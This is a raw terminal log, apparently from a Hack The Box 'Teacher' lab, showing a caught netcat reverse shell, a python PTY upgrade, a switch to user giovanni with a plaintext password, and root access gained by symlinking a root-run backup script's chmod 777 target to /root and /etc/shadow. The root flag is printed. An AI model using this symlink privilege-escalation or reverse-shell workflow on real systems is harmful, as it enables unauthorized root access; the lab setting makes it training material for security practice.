@@ -1,0 +1,123 @@
+┌─[root@parrot]─[~/hackthebox/teacher] 
+└──╼ #nc -nvlp 9002                    
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                   
+Ncat: Listening on :::9002             
+Ncat: Listening on 0.0.0.0:9002        
+Ncat: Connection from 10.10.10.153.    
+Ncat: Connection from 10.10.10.153:50052.                                      
+bash: cannot set terminal process group (818): Inappropriate ioctl for device  
+bash: no job control in this shell     
+www-data@teacher:/var/www/html/moodle/question$ su - giovanni                  
+su - giovanni                          
+su: must be run from a terminal        
+www-data@teacher:/var/www/html/moodle/question$ python -c "import pty ;pty.spawn('/bin/bash')"                                                                 
+<ion$ python -c "import pty ;pty.spawn('/bin/bash')"                           
+www-data@teacher:/var/www/html/moodle/question$ su - giovanni                  
+su - giovanni                          
+Password: expelled                     
+
+giovanni@teacher:~$ cd /home/giovanni/work                                     
+cd /home/giovanni/work                 
+giovanni@teacher:~/work$ cat /usr/bin/backup.sh                                
+cat /usr/bin/backup.sh                 
+#!/bin/bash                            
+cd /home/giovanni/work;                
+tar -czvf tmp/backup_courses.tar.gz courses/*;                                 
+cd tmp;                                
+tar -xf backup_courses.tar.gz;         
+chmod 777 * -R;                        
+giovanni@teacher:~/work$ ls -la        
+ls -la                                 
+total 12                               
+drwxr-xr-x 3 giovanni giovanni 4096 Dec 28 03:32 .                             
+drwxr-x--- 4 giovanni giovanni 4096 Dec 28 03:11 ..                            
+drwxrwxrwx 3 giovanni giovanni 4096 Jun 27  2018 courses                       
+lrwxrwxrwx 1 giovanni giovanni   11 Dec 28 03:32 tmp -> /etc/shadow            
+giovanni@teacher:~/work$ rm -r tmp     
+rm -r tmp                              
+giovanni@teacher:~/work$ ls            
+ls                                     
+courses                                
+giovanni@teacher:~/work$ ls -la        
+ls -la                                 
+total 12                               
+drwxr-xr-x 3 giovanni giovanni 4096 Dec 28 04:17 .                             
+drwxr-x--- 4 giovanni giovanni 4096 Dec 28 03:11 ..                            
+drwxrwxrwx 3 giovanni giovanni 4096 Jun 27  2018 courses                       
+giovanni@teacher:~/work$ mkdir tmp                                             
+mkdir tmp                              
+giovanni@teacher:~/work$ ls -la        
+ls -la                                 
+total 16                               
+drwxr-xr-x 4 giovanni giovanni 4096 Dec 28 04:18 .                             
+drwxr-x--- 4 giovanni giovanni 4096 Dec 28 03:11 ..                            
+drwxrwxrwx 3 giovanni giovanni 4096 Jun 27  2018 courses                       
+drwxrwxrwx 2 giovanni giovanni 4096 Dec 28 04:18 tmp                           
+giovanni@teacher:~/work$ ln -s /root ./tmp                                     
+ln -s /root ./tmp                      
+giovanni@teacher:~/work$ ls -la        
+ls -la                                 
+total 16                               
+drwxr-xr-x 4 giovanni giovanni 4096 Dec 28 04:18 .                             
+drwxr-x--- 4 giovanni giovanni 4096 Dec 28 03:11 ..                            
+drwxrwxrwx 3 giovanni giovanni 4096 Jun 27  2018 courses                       
+drwxrwxrwx 3 giovanni giovanni 4096 Dec 28 04:19 tmp                           
+giovanni@teacher:~/work$ cd tmp        
+cd tmp                                 
+giovanni@teacher:~/work/tmp$ ls -la    
+ls -la                                 
+total 16                               
+drwxrwxrwx 3 giovanni giovanni 4096 Dec 28 04:19 .                             
+drwxr-xr-x 4 giovanni giovanni 4096 Dec 28 04:18 ..                            
+-rwxrwxrwx 1 root     root      251 Dec 28 04:19 backup_courses.tar.gz         
+drwxrwxrwx 3 root     root     4096 Dec 28 04:19 courses                       
+lrwxrwxrwx 1 giovanni giovanni    5 Dec 28 04:19 root -> /root                 
+giovanni@teacher:~/work/tmp$ cd root   
+cd root                                
+-su: cd: root: Permission denied       
+giovanni@teacher:~/work/tmp$ ls -la /etc/shadow                                
+ls -la /etc/shadow                     
+-rwxrwxrwx 1 root shadow 961 Jun 27  2018 /etc/shadow                          
+giovanni@teacher:~/work/tmp$ cd root   
+cd root                                
+giovanni@teacher:~/work/tmp/root$ ls -la                                       
+ls -la                                 
+total 32                               
+drwxrwxrwx  3 root root 4096 Nov  4  2018 .                                    
+drwxr-xr-x 22 root root 4096 Oct 28  2018 ..                                   
+-rwxrwxrwx  1 root root  570 Jan 31  2010 .bashrc                              
+-rwxrwxrwx  1 root root    0 Jun 27  2018 .mysql_history                       
+drwxrwxrwx  2 root root 4096 Jun 27  2018 .nano                                
+-rwxrwxrwx  1 root root  148 Aug 17  2015 .profile                             
+-rwxrwxrwx  1 root root   33 Jun 27  2018 root.txt                             
+-rwxrwxrwx  1 root root   66 Jun 27  2018 .selected_editor                     
+-rwxrwxrwx  1 root root  174 Jun 27  2018 .wget-hsts                           
+giovanni@teacher:~/work/tmp/root$ cat root.txt                                 
+cat root.txt                           
+4f3a83b42ac7723a508b8ace7b8b1209       
+giovanni@teacher:~/work/tmp/root$ cat .nano                                    
+cat .nano                              
+cat: .nano: Is a directory             
+giovanni@teacher:~/work/tmp/root$ cd - 
+cd -                                   
+/home/giovanni/work/tmp                
+giovanni@teacher:~/work/tmp$ cd ..     
+cd ..                                  
+giovanni@teacher:~/work$ ls            
+ls                                     
+courses  tmp                           
+giovanni@teacher:~/work$ stty raw -eho 
+stty raw -eho                          
+stty: invalid argument ‘-eho’          
+Try 'stty --help' for more information.                                        
+giovanni@teacher:~/work$ stty raw -echo
+stty raw -echo                         
+giovanni@teacher:~/work$ ^Z            
+[1]+  Stopped                 nc -nvlp 9002                                    
+┌─[✗]─[root@parrot]─[~/hackthebox/teacher]                                     
+└──╼ #stty raw -echo                   
+┌─[root@parrot]─[~/hackthebox/teacher] 
+└──╼ #┌─[root@parrot]─[~/hackthebox/teacher]                                   
+└──╼ #-bash: exitnc: command not found 
+                                      ┌─[✗]─[root@parrot]─[~/hackthebox/teacher]                                                                               
+└──╼ #                                 
